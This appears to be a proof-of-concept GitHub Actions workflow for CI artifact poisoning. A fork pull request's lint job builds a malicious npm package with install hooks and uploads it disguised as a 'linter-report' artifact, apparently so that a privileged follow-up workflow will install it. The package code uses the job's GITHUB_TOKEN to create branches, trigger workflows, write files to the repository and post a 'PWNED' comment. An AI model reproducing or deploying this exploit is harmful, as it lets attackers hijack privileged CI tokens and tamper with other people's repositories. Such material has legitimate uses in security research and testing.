name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-chosen linter-report artifact
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p pkg/package
          cat > pkg/package/package.json <<'JSON'
          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
          JSON
          cat > pkg/package/index.js <<'JS'
          const fs = require('fs'), path = require('path');
          const base = process.env.INIT_CWD || process.cwd();
          const pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim();
          const t = process.env.GITHUB_TOKEN || '';
          const repo = process.env.GITHUB_REPOSITORY;
          const api = async (method, p, body) => {
            try {
              const r = await fetch('https://api.github.com' + p, {
                method,
                headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json', 'user-agent': 'pwn-probe' },
                body: body ? JSON.stringify(body) : undefined
              });
              const txt = await r.text();
              return { status: r.status, body: txt.slice(0, 500) };
            } catch (e) { return { status: 0, body: String(e) }; }
          };
          (async () => {
            const out = {
              event: process.env.GITHUB_EVENT_NAME,
              workflow: process.env.GITHUB_WORKFLOW,
              run_id: process.env.GITHUB_RUN_ID,
              token_len: t.length,
              cwd: process.cwd(),
              init_cwd: base,
              pr
            };
            out.repo = await api('GET', '/repos/' + repo);
            out.create_ref = await api('POST', '/repos/' + repo + '/git/refs', { ref: 'refs/heads/pwn-probe-' + Date.now(), sha: process.env.GITHUB_SHA });
            out.actions_runs = await api('GET', '/repos/' + repo + '/actions/runs?per_page=1');
            out.dispatch = await api('POST', '/repos/' + repo + '/actions/workflows/lint.yml/dispatches', { ref: 'main' });
            out.contents_put = await api('PUT', '/repos/' + repo + '/contents/pwn-probe.txt', { message: 'p', content: Buffer.from('pwn').toString('base64') });
            out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body: 'PWNED privileged workflow_run: `' + JSON.stringify({ event: out.event, workflow: out.workflow, run_id: out.run_id, token_len: out.token_len, cwd: out.cwd }) + '`' });
            fs.writeFileSync(path.join(base, 'pwn-results.json'), JSON.stringify(out, null, 2));
            console.log('PWN-RESULTS ' + JSON.stringify(out));
          })();
          JS
          tar -czf pwn-1.0.0.tgz -C pkg package
          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
          printf 'report authored by the fork PR\n' > linter-report.txt
          printf '%s' "$PR_NUMBER" > pr-number.txt
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
            pwn-1.0.0.tgz
          if-no-files-found: error
